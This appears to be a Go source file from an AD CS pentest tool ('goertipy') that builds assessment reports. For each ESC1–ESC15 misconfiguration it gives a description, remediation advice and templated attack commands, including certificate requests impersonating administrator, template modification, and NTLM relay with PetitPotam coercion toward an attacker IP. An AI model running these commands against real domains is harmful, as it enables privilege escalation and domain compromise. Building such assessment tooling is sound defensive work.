package output

import (
	"fmt"
	"html"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/slacker/goertipy/pkg/adcs"
)

// ESCInfo contains vulnerability knowledge for report generation.
type ESCInfo struct {
	Name        string
	Severity    string // Critical, High, Medium, Low
	Title       string
	Description string
	Attack      string // goertipy attack command template — %CA%, %TEMPLATE%, %DOMAIN%, %DC% are replaced
	Remediation string
}

// escKnowledgeBase maps ESC identifiers to their full descriptions.
var escKnowledgeBase = map[string]*ESCInfo{
	"ESC1": {
		Name:     "ESC1",
		Severity: "Critical",
		Title:    "Enrollee Supplies Subject with Authentication EKU",
		Description: "The template allows the enrollee to specify an arbitrary Subject Alternative Name (SAN) " +
			"in the certificate request, combined with an authentication-capable EKU (e.g., Client Authentication). " +
			"This allows any user with enrollment rights to request a certificate as any other user, including Domain Admins.",
		Attack: "# Request a certificate as Domain Admin\ngoertipy req -u <LOW_PRIV_USER> -p '<PASSWORD>' \\\n" +
			"    --dc-ip %DC% --ca '%CA%' --template '%TEMPLATE%' \\\n    --upn administrator@%DOMAIN%\n\n" +
			"# Authenticate with the certificate\ngoertipy auth -u administrator@%DOMAIN% --dc-ip %DC% \\\n" +
			"    --pfx <OUTPUT_PFX>",
		Remediation: "- Remove the `ENROLLEE_SUPPLIES_SUBJECT` flag from the template's `msPKI-Certificate-Name-Flag`\n" +
			"- Enable Manager Approval (`CT_FLAG_PEND_ALL_REQUESTS`) on the enrollment flag\n" +
			"- Restrict enrollment rights to only trusted groups\n" +
			"- Consider adding authorized signature requirements (`msPKI-RA-Signature`)",
	},
	"ESC2": {
		Name:     "ESC2",
		Severity: "High",
		Title:    "Any Purpose or No EKU Constraint",
		Description: "The template has either no Extended Key Usage (EKU) defined or includes the `Any Purpose` EKU. " +
			"Certificates issued from this template can be used for any purpose, including client authentication, " +
			"code signing, and subordinate CA impersonation.",
		Attack: "# Request a certificate (can be used for any purpose)\ngoertipy req -u <USER> -p '<PASSWORD>' \\\n" +
			"    --dc-ip %DC% --ca '%CA%' --template '%TEMPLATE%'\n\n" +
			"# Use for authentication\ngoertipy auth -u <USER>@%DOMAIN% --dc-ip %DC% --pfx <OUTPUT_PFX>",
		Remediation: "- Set explicit EKU constraints on the template (e.g., only Client Authentication)\n" +
			"- Remove the `Any Purpose` EKU OID (2.5.29.37.0)\n" +
			"- Restrict enrollment rights to only authorized users",
	},
	"ESC3": {
		Name:     "ESC3",
		Severity: "High",
		Title:    "Certificate Request Agent Abuse",
		Description: "The template has the `Certificate Request Agent` EKU, which allows the certificate holder " +
			"to enroll on behalf of other users. An attacker who can enroll in this template can act as an " +
			"enrollment agent and request certificates for any user, including Domain Admins.",
		Attack: "# Step 1: Enroll for a Certificate Request Agent cert\ngoertipy req -u <USER> -p '<PASSWORD>' \\\n" +
			"    --dc-ip %DC% --ca '%CA%' --template '%TEMPLATE%'\n\n" +
			"# Step 2: Use the agent cert to enroll on behalf of admin\n# (requires a second template that allows enrollment agents)",
		Remediation: "- Restrict enrollment rights on the Certificate Request Agent template\n" +
			"- Configure enrollment agent restrictions on the CA\n" +
			"- Enable Manager Approval on templates that allow agent requests",
	},
	"ESC4": {
		Name:     "ESC4",
		Severity: "High",
		Title:    "Dangerous ACL Permissions on Template",
		Description: "Low-privileged users have write access to the certificate template object (WriteDACL, " +
			"WriteOwner, WriteProperty, GenericWrite, or FullControl). An attacker can modify the template " +
			"to make it ESC1-exploitable, request a certificate, then restore the original configuration.",
		Attack: "# Modify the template to be ESC1-exploitable\ngoertipy template modify -u <USER> -H '<HASH>' \\\n" +
			"    --dc-ip %DC% --template '%TEMPLATE%'\n\n" +
			"# Request a cert as admin (template is now ESC1-vuln)\ngoertipy req -u <USER> -p '<PASSWORD>' \\\n" +
			"    --dc-ip %DC% --ca '%CA%' --template '%TEMPLATE%' \\\n    --upn administrator@%DOMAIN%\n\n" +
			"# Restore the template\ngoertipy template restore -u <USER> -H '<HASH>' \\\n" +
			"    --dc-ip %DC% --backup %TEMPLATE%_backup.json",
		Remediation: "- Remove WriteDACL, WriteOwner, WriteProperty, and FullControl rights from low-privileged groups\n" +
			"- Audit template object ACLs regularly\n" +
			"- Monitor for template attribute changes in Event Log",
	},
	"ESC6": {
		Name:     "ESC6",
		Severity: "High",
		Title:    "EDITF_ATTRIBUTESUBJECTALTNAME2 Enabled on CA",
		Description: "The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, which allows any enrollee " +
			"to specify a Subject Alternative Name (SAN) in the certificate request, regardless of template " +
			"settings. This effectively makes every template ESC1-exploitable.",
		Attack: "# Any template becomes exploitable when ESC6 is present\ngoertipy req -u <USER> -p '<PASSWORD>' \\\n" +
			"    --dc-ip %DC% --ca '%CA%' --template SubCA \\\n    --upn administrator@%DOMAIN%\n\n" +
			"# Authenticate\ngoertipy auth -u administrator@%DOMAIN% --dc-ip %DC% --pfx <OUTPUT_PFX>",
		Remediation: "- Remove the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag:\n" +
			"  `certutil -config \"CA_HOST\\CA_NAME\" -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`\n" +
			"- Restart the CA service after the change",
	},
	"ESC7": {
		Name:     "ESC7",
		Severity: "High",
		Title:    "Vulnerable CA Permissions (ManageCA / ManageCertificates)",
		Description: "Low-privileged users have ManageCA or ManageCertificates rights on the Certificate Authority. " +
			"ManageCA allows reconfiguring the CA (e.g., enabling ESC6). ManageCertificates allows approving " +
			"pending certificate requests, bypassing Manager Approval requirements.",
		Attack: "# If ManageCA: enable ESC6 flag, then exploit any template\ngoertipy ca config --ca '%CA%' \\\n" +
			"    -u <USER> -H '<HASH>' --dc-ip %DC%\n\n" +
			"# If ManageCertificates: approve a pending request\n# Submit a request to a template with Manager Approval,\n# then approve it via DCOM",
		Remediation: "- Remove ManageCA and ManageCertificates rights from low-privileged users\n" +
			"- Restrict CA administration to Domain Admins and PKI Admins only\n" +
			"- Audit CA security descriptor regularly",
	},
	"ESC8": {
		Name:     "ESC8",
		Severity: "Medium",
		Title:    "HTTP Enrollment (NTLM Relay Target)",
		Description: "The CA exposes HTTP-based enrollment endpoints (Web Enrollment, CEP, or CES). " +
			"These endpoints accept NTLM authentication, making them targets for NTLM relay attacks. " +
			"An attacker who can coerce machine or user authentication can relay it to the enrollment endpoint " +
			"and obtain a certificate.",
		Attack: "# Relay coerced NTLM authentication to the web enrollment endpoint\n# Using ntlmrelayx or similar:\n" +
			"ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp \\\n" +
			"    --adcs --template Machine\n\n" +
			"# Coerce authentication (e.g., PetitPotam, PrinterBug)\npython3 PetitPotam.py <ATTACKER_IP> <TARGET>",
		Remediation: "- Disable HTTP enrollment endpoints if not required\n" +
			"- Enable Extended Protection for Authentication (EPA) on IIS\n" +
			"- Require HTTPS with channel binding\n" +
			"- Enable `ENFORCE_ENCRYPTION` on enrollment endpoints",
	},
	"ESC9": {
		Name:     "ESC9",
		Severity: "High",
		Title:    "No Security Extension with Subject Control",
		Description: "The template has the `CT_FLAG_NO_SECURITY_EXTENSION` flag set and allows enrollee-supplied " +
			"subjects. Without the security extension (szOID_NTDS_CA_SECURITY_EXT), the KDC cannot map the " +
			"certificate to a strong identity, enabling impersonation via certificate mapping.",
		Attack: "# Request cert without security extension\ngoertipy req -u <USER> -p '<PASSWORD>' \\\n" +
			"    --dc-ip %DC% --ca '%CA%' --template '%TEMPLATE%' \\\n    --upn administrator@%DOMAIN%\n\n" +
			"# Authenticate — the cert won't have strong mapping\ngoertipy auth -u administrator@%DOMAIN% --dc-ip %DC% --pfx <OUTPUT_PFX>",
		Remediation: "- Remove the `CT_FLAG_NO_SECURITY_EXTENSION` flag from the template\n" +
			"- Enable strong certificate mapping in the domain (KB5014754)\n" +
			"- Restrict enrollment rights on affected templates",
	},
	"ESC13": {
		Name:     "ESC13",
		Severity: "High",
		Title:    "Issuance Policy Linked to Group (OID Group Link)",
		Description: "The template has issuance policies (msPKI-RA-Policies) that are linked to universal groups " +
			"via the `msDS-OIDToGroupLink` attribute. When a certificate is issued with these policies, the user " +
			"is effectively added to the linked group, granting them elevated privileges.",
		Attack: "# Enroll in the template — the issued cert grants group membership\ngoertipy req -u <USER> -p '<PASSWORD>' \\\n" +
			"    --dc-ip %DC% --ca '%CA%' --template '%TEMPLATE%'\n\n" +
			"# Authenticate — the TGT will include the group SID\ngoertipy auth -u <USER>@%DOMAIN% --dc-ip %DC% --pfx <OUTPUT_PFX>",
		Remediation: "- Remove the `msDS-OIDToGroupLink` attribute from the linked OID object\n" +
			"- Restrict enrollment rights on the template\n" +
			"- Audit issuance policy OID objects for group links",
	},
	"ESC15": {
		Name:     "ESC15",
		Severity: "Medium",
		Title:    "Schema Version 1 Template with Subject Control (EKUwu)",
		Description: "The template uses schema version 1 and allows enrollee-supplied subjects. Version 1 templates " +
			"do not support Application Policies, making EKU restrictions unreliable. The Application Policy " +
			"extension (used for EKU enforcement in v2+ templates) is absent, allowing abuse.",
		Attack: "# Request a certificate with a custom UPN\ngoertipy req -u <USER> -p '<PASSWORD>' \\\n" +
			"    --dc-ip %DC% --ca '%CA%' --template '%TEMPLATE%' \\\n    --upn administrator@%DOMAIN%\n\n" +
			"# Authenticate\ngoertipy auth -u administrator@%DOMAIN% --dc-ip %DC% --pfx <OUTPUT_PFX>",
		Remediation: "- Upgrade the template to schema version 2 or higher\n" +
			"- Remove the `ENROLLEE_SUPPLIES_SUBJECT` flag\n" +
			"- Set explicit Application Policy constraints",
	},
}

// severityOrder defines sort priority for findings.
var severityOrder = map[string]int{
	"Critical": 0,
	"High":     1,
	"Medium":   2,
	"Low":      3,
}

// ReportFormatter generates professional pentest reports.
type ReportFormatter struct {
	Writer io.Writer
	Domain string
	DCIP   string
	HTML   bool // If true, wrap markdown in HTML with embedded CSS
}

// NewReportFormatter creates a new report formatter.
func NewReportFormatter(w io.Writer, domain, dcip string, useHTML bool) *ReportFormatter {
	return &ReportFormatter{Writer: w, Domain: domain, DCIP: dcip, HTML: useHTML}
}

// finding is an internal struct for collected vulnerability findings.
type finding struct {
	ESC            string
	Info           *ESCInfo
	TemplateName   string
	CAName         string
	Enabled        bool
	Exploitability string
	PublishedBy    []string
	EnrollRights   []string
	IsCA           bool // true if this is a CA-level vulnerability
}

// Format generates the report from find results.
func (f *ReportFormatter) Format(result *adcs.FindResult) error {
	var sb strings.Builder

	domain := result.Domain
	if f.Domain != "" {
		domain = f.Domain
	}
	dcIP := f.DCIP

	// Collect all findings
	var findings []finding
	for _, tmpl := range result.Templates {
		if !tmpl.IsVulnerable() {
			continue
		}
		for _, esc := range tmpl.Vulnerabilities {
			info := escKnowledgeBase[esc]
			if info == nil {
				continue
			}
			caName := ""
			if len(tmpl.PublishedBy) > 0 {
				caName = tmpl.PublishedBy[0]
			}
			findings = append(findings, finding{
				ESC:            esc,
				Info:           info,
				TemplateName:   tmpl.Name,
				CAName:         caName,
				Enabled:        tmpl.Enabled,
				Exploitability: tmpl.Exploitability,
				PublishedBy:    tmpl.PublishedBy,
				EnrollRights:   tmpl.EnrollmentRights,
			})
		}
	}
	for _, ca := range result.CAs {
		for _, esc := range ca.Vulnerabilities {
			info := escKnowledgeBase[esc]
			if info == nil {
				continue
			}
			findings = append(findings, finding{
				ESC:    esc,
				Info:   info,
				CAName: ca.CAName,
				IsCA:   true,
			})
		}
	}

	// Sort by severity
	sortFindings(findings)

	// Count by severity
	severityCounts := map[string]int{}
	for _, f := range findings {
		severityCounts[f.Info.Severity]++
	}

	// ── Executive Summary ───────────────────────────────────────────
	sb.WriteString("# AD CS Security Assessment Report\n\n")
	sb.WriteString(fmt.Sprintf("**Domain:** %s  \n", domain))
	sb.WriteString(fmt.Sprintf("**DC/CA Server:** %s  \n", dcIP))
	sb.WriteString(fmt.Sprintf("**Date:** %s  \n", time.Now().Format("2006-01-02 15:04 UTC")))
	sb.WriteString(fmt.Sprintf("**Tool:** goertipy  \n\n"))

	sb.WriteString("## Executive Summary\n\n")
	sb.WriteString(fmt.Sprintf("Enumeration of Active Directory Certificate Services (AD CS) in **%s** identified "+
		"**%d Certificate Authority(s)** and **%d certificate templates** (%d enabled).\n\n",
		domain, result.TotalCAs, result.TotalTemplates, countEnabled(result.Templates)))

	if len(findings) == 0 {
		sb.WriteString("**No vulnerabilities were identified.** The AD CS configuration appears to follow security best practices.\n\n")
	} else {
		sb.WriteString(fmt.Sprintf("**%d vulnerability(ies)** were identified across %d unique ESC categories:\n\n",
			len(findings), len(result.ExploitableESCs)))

		sb.WriteString("| Severity | Count |\n|----------|-------|\n")
		for _, sev := range []string{"Critical", "High", "Medium", "Low"} {
			if c, ok := severityCounts[sev]; ok {
				icon := severityIcon(sev)
				sb.WriteString(fmt.Sprintf("| %s %s | %d |\n", icon, sev, c))
			}
		}
		sb.WriteString("\n")
	}

	// ── Risk Summary Table ──────────────────────────────────────────
	if len(findings) > 0 {
		sb.WriteString("## Risk Summary\n\n")
		sb.WriteString("| # | Severity | ESC | Affected Object | Type | Exploitability |\n")
		sb.WriteString("|---|----------|-----|-----------------|------|----------------|\n")
		for i, f := range findings {
			objType := "Template"
			objName := f.TemplateName
			exploit := f.Exploitability
			if f.IsCA {
				objType = "CA"
				objName = f.CAName
				exploit = "Exploitable"
			}
			if exploit == "" {
				exploit = "—"
			}
			sb.WriteString(fmt.Sprintf("| %d | %s %s | %s | %s | %s | %s |\n",
				i+1, severityIcon(f.Info.Severity), f.Info.Severity, f.ESC, objName, objType, exploit))
		}
		sb.WriteString("\n")
	}

	// ── Detailed Findings ───────────────────────────────────────────
	if len(findings) > 0 {
		sb.WriteString("## Detailed Findings\n\n")
		for i, f := range findings {
			sb.WriteString(fmt.Sprintf("### Finding %d: %s — %s\n\n", i+1, f.ESC, f.Info.Title))

			// Metadata
			sb.WriteString(fmt.Sprintf("**Severity:** %s %s  \n", severityIcon(f.Info.Severity), f.Info.Severity))
			if f.IsCA {
				sb.WriteString(fmt.Sprintf("**Affected CA:** %s  \n", f.CAName))
			} else {
				sb.WriteString(fmt.Sprintf("**Affected Template:** %s  \n", f.TemplateName))
				sb.WriteString(fmt.Sprintf("**Enabled:** %s  \n", boolYesNo(f.Enabled)))
				if len(f.PublishedBy) > 0 {
					sb.WriteString(fmt.Sprintf("**Published By:** %s  \n", strings.Join(f.PublishedBy, ", ")))
				}
				if len(f.EnrollRights) > 0 {
					sb.WriteString(fmt.Sprintf("**Enrollment Rights:** %s  \n", strings.Join(f.EnrollRights, ", ")))
				}
				sb.WriteString(fmt.Sprintf("**Exploitability:** %s  \n", f.Exploitability))
			}
			sb.WriteString("\n")

			// Description
			sb.WriteString("#### Description\n\n")
			sb.WriteString(f.Info.Description + "\n\n")

			// Attack Commands
			sb.WriteString("#### Attack Commands\n\n")
			attackCmd := f.Info.Attack
			attackCmd = strings.ReplaceAll(attackCmd, "%DOMAIN%", domain)
			attackCmd = strings.ReplaceAll(attackCmd, "%DC%", dcIP)
			if f.CAName != "" {
				attackCmd = strings.ReplaceAll(attackCmd, "%CA%", f.CAName)
			}
			if f.TemplateName != "" {
				attackCmd = strings.ReplaceAll(attackCmd, "%TEMPLATE%", f.TemplateName)
			}
			sb.WriteString("```bash\n")
			sb.WriteString(attackCmd)
			sb.WriteString("\n```\n\n")

			// Remediation
			sb.WriteString("#### Remediation\n\n")
			sb.WriteString(f.Info.Remediation + "\n\n")

			sb.WriteString("---\n\n")
		}
	}

	// ── CA Configuration Audit ──────────────────────────────────────
	sb.WriteString("## CA Configuration Audit\n\n")
	for _, ca := range result.CAs {
		sb.WriteString(fmt.Sprintf("### %s\n\n", ca.CAName))
		sb.WriteString(fmt.Sprintf("| Property | Value |\n|----------|-------|\n"))
		sb.WriteString(fmt.Sprintf("| DNS Hostname | %s |\n", ca.DNSHostName))
		if ca.Certificate != nil {
			sb.WriteString(fmt.Sprintf("| Subject | %s |\n", ca.Subject))
			sb.WriteString(fmt.Sprintf("| Valid From | %s |\n", ca.NotBefore.Format("2006-01-02")))
			sb.WriteString(fmt.Sprintf("| Valid Until | %s |\n", ca.NotAfter.Format("2006-01-02")))
			if ca.IsExpired() {
				sb.WriteString("| Status | ⚠️ **EXPIRED** |\n")
			} else {
				sb.WriteString("| Status | ✅ Valid |\n")
			}
		}
		sb.WriteString(fmt.Sprintf("| Published Templates | %d |\n", len(ca.CertificateTemplates)))
		sb.WriteString(fmt.Sprintf("| Web Enrollment | %s |\n", boolYesNo(ca.HasWebEnrollment)))
		if len(ca.Vulnerabilities) > 0 {
			sb.WriteString(fmt.Sprintf("| Vulnerabilities | %s |\n", strings.Join(ca.Vulnerabilities, ", ")))
		}
		sb.WriteString("\n")

		if len(ca.ManageCAPrincipals) > 0 {
			sb.WriteString("**ManageCA Rights:**\n")
			for _, p := range ca.ManageCAPrincipals {
				sb.WriteString(fmt.Sprintf("- %s\n", p))
			}
			sb.WriteString("\n")
		}
		if len(ca.ManageCertificatesPrincipals) > 0 {
			sb.WriteString("**ManageCertificates Rights:**\n")
			for _, p := range ca.ManageCertificatesPrincipals {
				sb.WriteString(fmt.Sprintf("- %s\n", p))
			}
			sb.WriteString("\n")
		}
	}

	// ── Appendix: Full Template Listing ─────────────────────────────
	sb.WriteString("## Appendix: Certificate Templates\n\n")
	sb.WriteString("| Template | Enabled | Schema | EKU | Enrollee Supplies Subject | Vulnerabilities |\n")
	sb.WriteString("|----------|---------|--------|-----|--------------------------|------------------|\n")
	for _, tmpl := range result.Templates {
		ekuNames := tmpl.GetEKUNames()
		ekuStr := strings.Join(ekuNames, ", ")
		if len(ekuStr) > 40 {
			ekuStr = ekuStr[:37] + "..."
		}
		vulns := "—"
		if len(tmpl.Vulnerabilities) > 0 {
			vulns = strings.Join(tmpl.Vulnerabilities, ", ")
		}
		sb.WriteString(fmt.Sprintf("| %s | %s | v%d | %s | %s | %s |\n",
			tmpl.Name, boolYesNo(tmpl.Enabled), tmpl.SchemaVersion, ekuStr,
			boolYesNo(tmpl.EnrolleeSuppliesSubject), vulns))
	}
	sb.WriteString("\n")

	sb.WriteString("---\n\n")
	sb.WriteString(fmt.Sprintf("*Report generated by goertipy on %s*\n", time.Now().Format("2006-01-02 15:04:05 UTC")))

	// Write output
	content := sb.String()
	if f.HTML {
		content = wrapHTML(content, domain)
	}

	_, err := io.WriteString(f.Writer, content)
	return err
}

// ── Helpers ─────────────────────────────────────────────────────────

func sortFindings(findings []finding) {
	for i := 0; i < len(findings); i++ {
		for j := i + 1; j < len(findings); j++ {
			si := severityOrder[findings[i].Info.Severity]
			sj := severityOrder[findings[j].Info.Severity]
			if sj < si {
				findings[i], findings[j] = findings[j], findings[i]
			}
		}
	}
}

func countEnabled(templates []*adcs.CertificateTemplate) int {
	n := 0
	for _, t := range templates {
		if t.Enabled {
			n++
		}
	}
	return n
}

func severityIcon(sev string) string {
	switch sev {
	case "Critical":
		return "🔴"
	case "High":
		return "🟠"
	case "Medium":
		return "🟡"
	case "Low":
		return "🟢"
	default:
		return "⚪"
	}
}

func boolYesNo(b bool) string {
	if b {
		return "Yes"
	}
	return "No"
}

// wrapHTML wraps markdown content in a self-contained HTML page with dark theme.
func wrapHTML(markdown, domain string) string {
	// Convert markdown to basic HTML
	htmlContent := markdownToHTML(markdown)

	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AD CS Security Report — %s</title>
<style>
:root {
    --bg: #0d1117; --surface: #161b22; --border: #30363d;
    --text: #e6edf3; --text-dim: #8b949e; --accent: #58a6ff;
    --red: #f85149; --orange: #d29922; --yellow: #e3b341;
    --green: #3fb950; --purple: #bc8cff;
}
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
    background: var(--bg); color: var(--text); line-height: 1.6;
    max-width: 1000px; margin: 0 auto; padding: 2rem;
}
h1 { color: var(--accent); border-bottom: 2px solid var(--border); padding-bottom: 0.5rem; margin: 1.5rem 0 1rem; font-size: 1.8rem; }
h2 { color: var(--purple); border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; margin: 2rem 0 0.8rem; font-size: 1.4rem; }
h3 { color: var(--accent); margin: 1.5rem 0 0.5rem; font-size: 1.15rem; }
h4 { color: var(--text-dim); margin: 1rem 0 0.3rem; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.05em; }
p { margin: 0.5rem 0; }
strong { color: var(--accent); }
table { width: 100%%; border-collapse: collapse; margin: 0.8rem 0; font-size: 0.9rem; }
th { background: var(--surface); color: var(--accent); text-align: left; padding: 0.6rem 0.8rem; border: 1px solid var(--border); }
td { padding: 0.5rem 0.8rem; border: 1px solid var(--border); }
tr:nth-child(even) td { background: rgba(22,27,34,0.5); }
pre { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 1rem; overflow-x: auto; margin: 0.5rem 0; }
code { font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace; font-size: 0.85rem; color: var(--green); }
hr { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
ul, ol { padding-left: 1.5rem; margin: 0.3rem 0; }
li { margin: 0.2rem 0; }
em { color: var(--text-dim); }
</style>
</head>
<body>
%s
</body>
</html>`, html.EscapeString(domain), htmlContent)
}

// markdownToHTML does a basic markdown-to-HTML conversion for the report.
// It handles headings, tables, code blocks, bold, italic, lists, and horizontal rules.
func markdownToHTML(md string) string {
	var out strings.Builder
	lines := strings.Split(md, "\n")
	inCodeBlock := false
	inTable := false
	inList := false

	for i := 0; i < len(lines); i++ {
		line := lines[i]

		// Code blocks
		if strings.HasPrefix(line, "```") {
			if inCodeBlock {
				out.WriteString("</code></pre>\n")
				inCodeBlock = false
			} else {
				out.WriteString("<pre><code>")
				inCodeBlock = true
			}
			continue
		}
		if inCodeBlock {
			out.WriteString(html.EscapeString(line) + "\n")
			continue
		}

		// Close table if we're leaving a table block
		if inTable && !strings.HasPrefix(line, "|") {
			out.WriteString("</tbody></table>\n")
			inTable = false
		}

		// Close list if we're leaving a list block
		if inList && !strings.HasPrefix(line, "- ") && strings.TrimSpace(line) != "" {
			out.WriteString("</ul>\n")
			inList = false
		}

		// Horizontal rule
		if line == "---" {
			out.WriteString("<hr>\n")
			continue
		}

		// Headings
		if strings.HasPrefix(line, "#### ") {
			out.WriteString(fmt.Sprintf("<h4>%s</h4>\n", inlineFormat(line[5:])))
			continue
		}
		if strings.HasPrefix(line, "### ") {
			out.WriteString(fmt.Sprintf("<h3>%s</h3>\n", inlineFormat(line[4:])))
			continue
		}
		if strings.HasPrefix(line, "## ") {
			out.WriteString(fmt.Sprintf("<h2>%s</h2>\n", inlineFormat(line[3:])))
			continue
		}
		if strings.HasPrefix(line, "# ") {
			out.WriteString(fmt.Sprintf("<h1>%s</h1>\n", inlineFormat(line[2:])))
			continue
		}

		// Table rows
		if strings.HasPrefix(line, "|") {
			cells := parseTableRow(line)
			if len(cells) == 0 {
				continue
			}
			// Check if next line is separator (|---|---|)
			if !inTable {
				// This is the header row
				out.WriteString("<table><thead><tr>")
				for _, c := range cells {
					out.WriteString(fmt.Sprintf("<th>%s</th>", inlineFormat(c)))
				}
				out.WriteString("</tr></thead><tbody>\n")
				inTable = true
				// Skip separator line if present
				if i+1 < len(lines) && strings.Contains(lines[i+1], "---") {
					i++
				}
			} else {
				out.WriteString("<tr>")
				for _, c := range cells {
					out.WriteString(fmt.Sprintf("<td>%s</td>", inlineFormat(c)))
				}
				out.WriteString("</tr>\n")
			}
			continue
		}

		// Unordered list
		if strings.HasPrefix(line, "- ") {
			if !inList {
				out.WriteString("<ul>\n")
				inList = true
			}
			out.WriteString(fmt.Sprintf("<li>%s</li>\n", inlineFormat(line[2:])))
			continue
		}

		// Empty line
		if strings.TrimSpace(line) == "" {
			continue
		}

		// Paragraph
		out.WriteString(fmt.Sprintf("<p>%s</p>\n", inlineFormat(line)))
	}

	if inTable {
		out.WriteString("</tbody></table>\n")
	}
	if inList {
		out.WriteString("</ul>\n")
	}

	return out.String()
}

// inlineFormat handles bold, italic, code, and line breaks in inline text.
func inlineFormat(s string) string {
	s = html.EscapeString(s)
	// Bold
	for strings.Contains(s, "**") {
		s = strings.Replace(s, "**", "<strong>", 1)
		s = strings.Replace(s, "**", "</strong>", 1)
	}
	// Inline code
	for strings.Contains(s, "`") {
		s = strings.Replace(s, "`", "<code>", 1)
		s = strings.Replace(s, "`", "</code>", 1)
	}
	// Italic
	for strings.Contains(s, "*") {
		s = strings.Replace(s, "*", "<em>", 1)
		s = strings.Replace(s, "*", "</em>", 1)
	}
	// Line breaks
	if strings.HasSuffix(s, "  ") {
		s = strings.TrimRight(s, " ") + "<br>"
	}
	return s
}

// parseTableRow splits a markdown table row into cells.
func parseTableRow(line string) []string {
	line = strings.TrimPrefix(line, "|")
	line = strings.TrimSuffix(line, "|")
	parts := strings.Split(line, "|")
	var cells []string
	for _, p := range parts {
		p = strings.TrimSpace(p)
		// Skip separator rows
		if p == "---" || p == "----" || p == "-----" || p == "------" ||
			strings.Trim(p, "-") == "" {
			return nil
		}
		cells = append(cells, p)
	}
	return cells
}

// GeneratePDF renders the HTML report to a PDF file using an external tool.
// It tries wkhtmltopdf first, then Chrome/Chromium headless.
func GeneratePDF(result *adcs.FindResult, domain, dcip, pdfPath string) error {
	// Generate the HTML report to a temp file
	tmpDir, err := os.MkdirTemp("", "goertipy-report-*")
	if err != nil {
		return fmt.Errorf("failed to create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	htmlPath := filepath.Join(tmpDir, "report.html")
	htmlFile, err := os.Create(htmlPath)
	if err != nil {
		return fmt.Errorf("failed to create temp HTML: %w", err)
	}

	formatter := NewReportFormatter(htmlFile, domain, dcip, true)
	if err := formatter.Format(result); err != nil {
		htmlFile.Close()
		return fmt.Errorf("failed to generate HTML report: %w", err)
	}
	htmlFile.Close()

	// Make pdfPath absolute
	absPDF, err := filepath.Abs(pdfPath)
	if err != nil {
		absPDF = pdfPath
	}

	// Try wkhtmltopdf first
	if path, err := exec.LookPath("wkhtmltopdf"); err == nil {
		cmd := exec.Command(path,
			"--quiet",
			"--enable-local-file-access",
			"--page-size", "A4",
			"--margin-top", "15mm",
			"--margin-bottom", "15mm",
			"--margin-left", "15mm",
			"--margin-right", "15mm",
			htmlPath, absPDF,
		)
		if err := cmd.Run(); err == nil {
			return nil
		}
	}

	// Try Chrome / Chromium headless
	for _, browser := range []string{"google-chrome", "google-chrome-stable", "chromium", "chromium-browser"} {
		if path, err := exec.LookPath(browser); err == nil {
			cmd := exec.Command(path,
				"--headless",
				"--disable-gpu",
				"--no-sandbox",
				"--print-to-pdf="+absPDF,
				htmlPath,
			)
			if err := cmd.Run(); err == nil {
				return nil
			}
		}
	}

	return fmt.Errorf("PDF generation requires wkhtmltopdf or Chrome/Chromium. " +
		"Install one of them, or use --report-html and convert manually.\n" +
		"  apt install wkhtmltopdf        # Debian/Ubuntu\n" +
		"  brew install wkhtmltopdf        # macOS")
}
